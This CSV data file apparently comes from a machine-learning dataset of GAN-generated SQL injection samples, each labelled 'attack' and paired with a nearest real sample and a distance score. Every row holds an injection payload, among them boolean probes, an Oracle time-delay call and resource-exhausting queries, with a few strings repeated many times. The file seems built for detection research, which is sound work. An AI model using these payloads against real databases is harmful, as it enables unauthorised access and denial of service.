id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_001604,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.331262876525979
GAN_001605,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.303083987531574
GAN_001606,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.113320002585166
GAN_001607,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,7.148494680340257
GAN_001608,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.218230208522746
GAN_001609,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.298964120228202
GAN_001610,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.338495200160533
GAN_001611,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.151731071553
GAN_001612,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.440157435557076
GAN_001613,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,7.707088658322747
GAN_001614,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.545714769812763
GAN_001615,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.947594920715829
GAN_001616,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,5.77095218473935
GAN_001617,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.788439715139971
GAN_001618,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.655193954665593
GAN_001619,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.219990277823337
GAN_001620,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.6644362423519174
GAN_001621,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.790174617950764
GAN_001622,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.028059804961501
GAN_001623,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.799123705193417
GAN_001624,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.398648006810052
GAN_001625,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.567273282616093
GAN_001626,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.741443735424264
GAN_001627,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,6.358954341425427
GAN_001628,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.271290224478227
GAN_001629,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.774161654870074
GAN_001630,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.105933067785702
GAN_001631,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.4305712055148785
GAN_001632,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.347493738307615
GAN_001633,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.922383393851994
GAN_001634,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,6.051888732392793
GAN_001635,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.863785172966608
GAN_001636,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.894600010806672
GAN_001637,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.416511992238163
GAN_001638,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.46572605465137
GAN_001639,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.4401302038880015
GAN_001640,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.1534858392671845
GAN_001641,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.829413760268669
GAN_001642,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.422571672717188
GAN_001643,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.0250303074785965
GAN_001644,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,5.996318133648643
GAN_001645,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.999126492848651
GAN_001646,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.774135404746311
GAN_001647,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.189918805409899
GAN_001648,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.1458776996642595
GAN_001649,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.811531053202146
GAN_001650,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,9.013514970899083
GAN_001651,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.886479337765261
GAN_001652,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.865034910154037
GAN_001653,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.184049163738775
GAN_001654,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.734152038303067
GAN_001655,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,8.38892655248599
GAN_001656,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.039654049983075
GAN_001657,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.708448066443831
GAN_001658,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.88284699538518
GAN_001659,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.48793202926578
GAN_001660,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.318442996140701
GAN_001661,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.752819091812962
GAN_001662,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.458971858626252
GAN_001663,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,8.20453382557055
GAN_001664,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000061,9.191573139474354
GAN_001665,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.516089463758872
GAN_001666,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.903153815610877
GAN_001667,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.393505942594819
GAN_001668,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.648318636276166
GAN_001669,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.463706322513352
GAN_001670,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.224406784945222
GAN_001671,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.897390329231936
GAN_001672,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.772573349508687
GAN_001673,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.295939093297412
GAN_001674,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,8.138934438514008
GAN_001675,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,5.646819018122276
GAN_001676,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.331380704736117
GAN_001677,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.289597191325093
GAN_001678,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.769286539026369
GAN_001679,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.937332587639769
GAN_001680,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,5.986687968439199
GAN_001681,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.5851864725050495
GAN_001682,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.13916450333745
GAN_001683,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.514853246488461
GAN_001684,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.239750221980953
GAN_001685,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.958512661878092
GAN_001686,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.003721826845116
GAN_001687,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,7.512622883904062
GAN_001688,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.759476731588967
GAN_001689,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.958164067182501
GAN_001690,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.604877883323971
GAN_001691,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,8.472393010122946
GAN_001692,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.444303954575974
GAN_001693,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.360004469087636
GAN_001694,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.345680635756958
GAN_001695,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.536774170414962
GAN_001696,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.128692601204214
GAN_001697,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.637438219550869
GAN_001698,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,5.8972527549112295
GAN_001699,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.566253469523177
GAN_001700,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.071427412139696
GAN_001701,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.668800419285339
GAN_001702,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.013509167667473
GAN_001703,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,4.746544080949736
GAN_001704,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.511321067406539
GAN_001705,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.007816693439127
GAN_001706,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.077279657090719
GAN_001707,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.079230406928192
GAN_001708,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,6.405734854915531
GAN_001709,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.836207432910126
GAN_001710,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.5016196438149185
GAN_001711,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.625277396965764
GAN_001712,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.496226843063629
GAN_001713,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,5.539461149878645
GAN_001714,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.52066379624162
GAN_001715,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.085287146636696
GAN_001716,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.990567403965917
GAN_001717,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,5.045226964271704
GAN_001718,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.30676046593252
GAN_001719,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.835069852191468
GAN_001720,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.768123114857468
GAN_001721,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.0046589352224995
GAN_001722,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.213540801482722
GAN_001723,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,4.827610711087537
GAN_001724,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.185876704354041
GAN_001725,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.95519185032245
GAN_001726,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,5.24372546199856
GAN_001727,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.904256003457973
GAN_001728,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.382901393206849
GAN_001729,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.969945687507872
GAN_001730,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.745453703318485
GAN_001731,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.371435843895217
GAN_001732,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.020919509781469
GAN_001733,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.953362440275599
GAN_001734,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.307814932891351
GAN_001735,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,5.337277432206652
GAN_001736,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.190061354038721
GAN_001737,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.527089527630039
